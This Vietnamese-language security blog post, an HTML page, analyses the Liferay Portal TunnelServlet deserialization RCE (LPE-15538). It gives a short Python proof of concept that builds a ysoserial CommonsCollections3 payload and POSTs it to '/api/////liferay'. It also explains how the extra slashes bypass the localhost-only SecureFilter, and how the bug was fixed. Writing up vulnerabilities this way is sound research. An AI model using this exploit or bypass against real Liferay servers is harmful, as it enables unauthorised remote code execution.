@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538) - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:title" content="Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)" />
+<meta property="og:description" content="Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538) {{ .Resources.Match &ldquo;images/*&rdquo;}}
+Mô tả và ảnh hưởng
+Liferay TunnelServlet bị lỗ hổng insecure deserialization do cấu hình sai, có thể bị truy cập bởi attacker (theo mặc định, nó chỉ bị giới hạn truy cập từ localhost). Tùy thuộc vào phiên bản của Liferay Portal, attacker có thể khai thác lỗ hổng này bằng cách sử dụng dữ liệu đã được serialized để thực thi mã tùy ý trên hệ thống." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code-execution/liferay-tunnelservlet-deserialization-remote-code/" /><meta property="og:image" content="https://g03m0n.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-22T08:29:01+08:00" />
+<meta property="article:modified_time" content="2023-11-22T08:29:01+08:00" /><meta property="og:site_name" content="g03m0n" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://g03m0n.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)"/>
+<meta name="twitter:description" content="Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538) {{ .Resources.Match &ldquo;images/*&rdquo;}}
+Mô tả và ảnh hưởng
+Liferay TunnelServlet bị lỗ hổng insecure deserialization do cấu hình sai, có thể bị truy cập bởi attacker (theo mặc định, nó chỉ bị giới hạn truy cập từ localhost). Tùy thuộc vào phiên bản của Liferay Portal, attacker có thể khai thác lỗ hổng này bằng cách sử dụng dữ liệu đã được serialized để thực thi mã tùy ý trên hệ thống."/>
+<meta name="application-name" content="g03m0n">
+<meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code-execution/liferay-tunnelservlet-deserialization-remote-code/" /><link rel="prev" href="https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/" /><link rel="next" href="https://g03m0n.github.io/posts/cve-2024-40075/cve-2024-40075/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/g03m0n.github.io\/posts\/liferay-tunnelservlet-deserialization-remote-code\/liferay-tunnelservlet-deserialization-remote-code-execution\/liferay-tunnelservlet-deserialization-remote-code\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
+                            "width":  3200 ,
+                            "height":  2048 
+                        }],"genre": "posts","keywords": "cve, apache_spark","wordcount":  671 ,
+        "url": "https:\/\/g03m0n.github.io\/posts\/liferay-tunnelservlet-deserialization-remote-code\/liferay-tunnelservlet-deserialization-remote-code-execution\/liferay-tunnelservlet-deserialization-remote-code\/","datePublished": "2023-11-22T08:29:01+08:00","dateModified": "2023-11-22T08:29:01+08:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "g03m0n"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="g03m0n"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/avatar.png"
+        data-srcset="/images/avatar.png, /images/avatar.png 1.5x, /images/avatar.png 2x"
+        data-sizes="auto"
+        alt="/images/avatar.png"
+        title="/images/avatar.png" />g03m0n</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/cves/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVEs</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-11-22">2023-11-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;671 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><h1 id="liferay-tunnelservlet-deserialization-remote-code-execution-lpe-15538">Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</h1>
+<p>{{ .Resources.Match &ldquo;images/*&rdquo;}}</p>
+<ol>
+<li>
+<p>Mô tả và ảnh hưởng</p>
+<p>Liferay TunnelServlet bị lỗ hổng insecure deserialization do cấu hình sai, có thể bị truy cập bởi attacker (theo mặc định, nó chỉ bị giới hạn truy cập từ localhost). Tùy thuộc vào phiên bản của Liferay Portal, attacker có thể khai thác lỗ hổng này bằng cách sử dụng dữ liệu đã được serialized để thực thi mã tùy ý trên hệ thống.</p>
+<p>Các phiên bản ảnh hưởng:</p>
+<ul>
+<li>Liferay Portal CE 7.0 GA3, 7.0.1 GA2, 7.0.2 GA3</li>
+<li>Liferay Portal EE 6.0, 6.0 SP1, 6.0 SP2, 6.1 GA1, 6.1 GA2, 6.1 GA3, 6.2</li>
+<li>Liferay Digital Enterprise 7.0</li>
+</ul>
+</li>
+<li>
+<p>Chuẩn bị môi trường</p>
+<p>Cài đặt phiên bản ảnh hưởng: <a href="https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download" target="_blank" rel="noopener noreffer"><strong>https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download</strong></a>
+</p>
+<p>Giải nén và chạy file <code>..\liferay-portal-6.1.0-ce-ga1\tomcat-7.0.23\bin\startup.bat</code> để khởi chạy server.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled.png"
+        data-srcset="images/Untitled.png, images/Untitled.png 1.5x, images/Untitled.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled.png"
+        title="Untitled" /></p>
+</li>
+<li>
+<p>Demo khai thác</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>, <span style="color:#a6e22e">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.84:8080&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;java \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-jar ./ysoserial-all.jar CommonsCollections3 calc.exe &gt; payload.bin &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/////liferay&#34;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>))
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%201.png"
+        data-srcset="images/Untitled%201.png, images/Untitled%201.png 1.5x, images/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%201.png"
+        title="Untitled" /></p>
+</li>
+<li>
+<p>Phân tích lỗ hổng</p>
+</li>
+</ol>
+<p>Tại file <code>..\tomcat-7.0.23\webapps\ROOT\WEB-INF\web.xml</code>, ta biết được các request đến <code>/api/liferay/*</code> sẽ được class Tunnel Servlet xử lí.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%202.png"
+        data-srcset="images/Untitled%202.png, images/Untitled%202.png 1.5x, images/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%202.png"
+        title="Untitled" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%203.png"
+        data-srcset="images/Untitled%203.png, images/Untitled%203.png 1.5x, images/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%203.png"
+        title="Untitled" /></p>
+<p>Đi vào class Tunnel Servlet.</p>
+<p>Tại đây, phương thức <code>doPost</code> dùng để xử lý POST request, TunnelServlet nhận <code>ObjectInputStream</code> từ Post data (dòng 40) và sử dụng hàm <code>readObject()</code> (dòng 52) không đúng cách → Insecure deserialization.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%204.png"
+        data-srcset="images/Untitled%204.png, images/Untitled%204.png 1.5x, images/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%204.png"
+        title="Untitled" /></p>
+<p>Tuy nhiên, các đường dẫn <code>/api/liferay/*</code> mặc định chỉ được truy cập bởi localhost, mọi request từ bên ngoài đều bị filter. Cụ thể, khi truy cập <code>/api/liferay/*</code> thì Tunnel Servlet Filter được sử dụng.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%205.png"
+        data-srcset="images/Untitled%205.png, images/Untitled%205.png 1.5x, images/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%205.png"
+        title="Untitled" /></p>
+<p>Nó được định nghĩa tại class <code>com.liferay.portal.servlet.filters.secure.SecureFilter</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%206.png"
+        data-srcset="images/Untitled%206.png, images/Untitled%206.png 1.5x, images/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%206.png"
+        title="Untitled" /></p>
+<p>Tại class <code>SecureFilter</code>, hàm <code>processFilter</code> được gọi để thực hiện các quy trình filter. Trong đó có chức năng kiểm tra xem Remote Address có nằm trong whitelist các Allowed host được access hay không bằng hàm <code>isAccessAllowed()</code>. Nếu không thì sẽ bị trả 403 Access denied. Đặt breakpoint như hình và debug.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%207.png"
+        data-srcset="images/Untitled%207.png, images/Untitled%207.png 1.5x, images/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%207.png"
+        title="Untitled" /></p>
+<p>Đặt Breakepoint tại dòng 86 và gửi gón tin POST tới</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%208.png"
+        data-srcset="images/Untitled%208.png, images/Untitled%208.png 1.5x, images/Untitled%208.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%208.png"
+        title="Untitled" /></p>
+<p>Hit breakpoint</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%209.png"
+        data-srcset="images/Untitled%209.png, images/Untitled%209.png 1.5x, images/Untitled%209.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%209.png"
+        title="Untitled" /></p>
+<p>F7 để đi vào hàm <code>isAccessAllowed()</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2010.png"
+        data-srcset="images/Untitled%2010.png, images/Untitled%2010.png 1.5x, images/Untitled%2010.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2010.png"
+        title="Untitled" /></p>
+<p>Tại đây, ứng dụng sẽ kiểm tra xem <code>remoteAddr</code> (192.168.1.84) có nằm trong mảng whitelist ({SERVER_IP, 127.0.0.1}) <code>hostAllowed</code> hay không → nó không thuộc whitelist → Access denied.</p>
+<p>Tuy nhiên, để bypass filter này ta chỉ cần thêm n dấu <code>/</code> vào path <code>/api/liferay</code> → <code>/api/////liferay</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2011.png"
+        data-srcset="images/Untitled%2011.png, images/Untitled%2011.png 1.5x, images/Untitled%2011.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2011.png"
+        title="Untitled" /></p>
+<p>Khi truy cập endpoint <code>/api/liferay</code>, đầu tiên request sẽ được filter thông qua hàm <code>doFilter()</code> của InvokerFilter class. Sau đó các <code>InvokerFilterChain</code> về urlPattern: <code>/api/liferay/*</code> được lấy để thực hiện filter request. Có thể thấy với /api/liferay thì có đi qua <code>SecureFilter</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2012.png"
+        data-srcset="images/Untitled%2012.png, images/Untitled%2012.png 1.5x, images/Untitled%2012.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2012.png"
+        title="Untitled" /></p>
+<p>Còn <code>/api////////liferay</code> thì không:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2013.png"
+        data-srcset="images/Untitled%2013.png, images/Untitled%2013.png 1.5x, images/Untitled%2013.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2013.png"
+        title="Untitled" /></p>
+<p>Nguyên nhân nằm ở nơi lấy <code>InvokerFilterChain</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2014.png"
+        data-srcset="images/Untitled%2014.png, images/Untitled%2014.png 1.5x, images/Untitled%2014.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2014.png"
+        title="Untitled" /></p>
+<p>Tại đây phương thức <code>getInvokerFilter()</code>  được gọi để thiết lập filterChain cho url, với các tham số truyền vào là <code>request</code> hiện tại, <code>uri</code> (/api/////liferay) và <code>filterchain</code></p>
+<p>Đi vào phương thức <code>getInvokerFilterChain()</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2015.png"
+        data-srcset="images/Untitled%2015.png, images/Untitled%2015.png 1.5x, images/Untitled%2015.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2015.png"
+        title="Untitled" /></p>
+<p>Phương thức sẽ lấy <code>filterChain</code> từ 1 list có trước (<code>_filterChains</code>), với key chính là hashcode của uri truyền vào.
+Trong trường hợp truyền vào <code>/api////////liferay</code> thì sẽ tạo ra 1 hashcode khác, không tồn tại trong <code>_filterChains</code>, khi đó <code>invokerFilterChain == null</code> và sẽ nhảy tiếp vào phương thức
+<code>_invokerFilterHelper.createInvokerFilterChain()</code> để tạo ra 1 object <code>filterChain</code> mới.</p>
+<p>Đi vào phương thức <code>createInvokerFilterChain()</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2016.png"
+        data-srcset="images/Untitled%2016.png, images/Untitled%2016.png 1.5x, images/Untitled%2016.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2016.png"
+        title="Untitled" /></p>
+<p>Phương thức sẽ check match của uri truyền vào với các filterMap đã có sẵn.</p>
+<p>Chức năng của phương thức <code>isMatch()</code>là check xem uri truyền vào có giống với pattern của rule không, nếu có thì sẽ trả về true và add filter này vào list.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2017.png"
+        data-srcset="images/Untitled%2017.png, images/Untitled%2017.png 1.5x, images/Untitled%2017.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2017.png"
+        title="Untitled" /></p>
+<p>Bởi vì giá trị trả về của <code>isMatchURLPattern</code> là false nên filter này sẽ không được add vào <code>invokerFilterChain</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/8c5edcf0-2e59-42ac-94e5-924dd109b020.png"
+        data-srcset="images/8c5edcf0-2e59-42ac-94e5-924dd109b020.png, images/8c5edcf0-2e59-42ac-94e5-924dd109b020.png 1.5x, images/8c5edcf0-2e59-42ac-94e5-924dd109b020.png 2x"
+        data-sizes="auto"
+        alt="images/8c5edcf0-2e59-42ac-94e5-924dd109b020.png"
+        title="Untitled" /></p>
+<p>Có thể nhìn thấy được <code>uri</code> truyền vào và <code>urlpattern</code> không match do <code>matchURLPattern</code> trả về false</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2018.png"
+        data-srcset="images/Untitled%2018.png, images/Untitled%2018.png 1.5x, images/Untitled%2018.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2018.png"
+        title="Untitled" /></p>
+<p>→ <code>SecureFilter</code> không được add vào với request là <code>/api/////////liferay</code></p>
+<p>→ <code>SecureFilter</code> không được invoke nên bị bypass</p>
+<ol>
+<li>Sửa lỗi của NPH.</li>
+</ol>
+<p>Liferay đã thêm một hàm <code>ProtectedClassLoaderObjectInputStream()</code> để filter những authenticated access, và userInputStream.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2019.png"
+        data-srcset="images/Untitled%2019.png, images/Untitled%2019.png 1.5x, images/Untitled%2019.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2019.png"
+        title="Untitled" /></p>
+<p>Tại các phiên bản sau, sau khi lấy URI bằng hàm <code>getURI()</code> tại class InvokerFilter Liferay đã thực hiện normalize lại nó bằng hàm <code>HttpComponentsUtil.normalizePath()</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2020.png"
+        data-srcset="images/Untitled%2020.png, images/Untitled%2020.png 1.5x, images/Untitled%2020.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2020.png"
+        title="Untitled" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/Untitled%2021.png"
+        data-srcset="images/Untitled%2021.png, images/Untitled%2021.png 1.5x, images/Untitled%2021.png 2x"
+        data-sizes="auto"
+        alt="images/Untitled%2021.png"
+        title="Untitled" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-11-22</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code-execution/liferay-tunnelservlet-deserialization-remote-code/" data-title="Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)" data-hashtags="cve,apache_spark"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code-execution/liferay-tunnelservlet-deserialization-remote-code/" data-hashtag="cve"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code-execution/liferay-tunnelservlet-deserialization-remote-code/" data-title="Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cve/">cve</a>,&nbsp;<a href="/tags/apache_spark/">apache_spark</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/cve-2020-9840/cve-2020-9840/" class="prev" rel="prev" title="CVE-2020-9480"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2020-9480</a>
+            <a href="/posts/cve-2024-40075/cve-2024-40075/" class="next" rel="next" title="CVE-2024-40075">CVE-2024-40075<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="fb-root" class="comment"></div>
+            <div
+                class="fb-comments"
+                data-href="https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code-execution/liferay-tunnelservlet-deserialization-remote-code/"
+                data-width="100%"
+                data-numposts="10"
+            ></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://developers.facebook.com/docs/plugins/comments/"></a>Facebook</a>.
+            </noscript><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.120.4">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.css"><script type="text/javascript" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v5.0&amp;appId=2950291851778582&amp;autoLogAppEvents=1" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/mhchem.min.js"></script><script 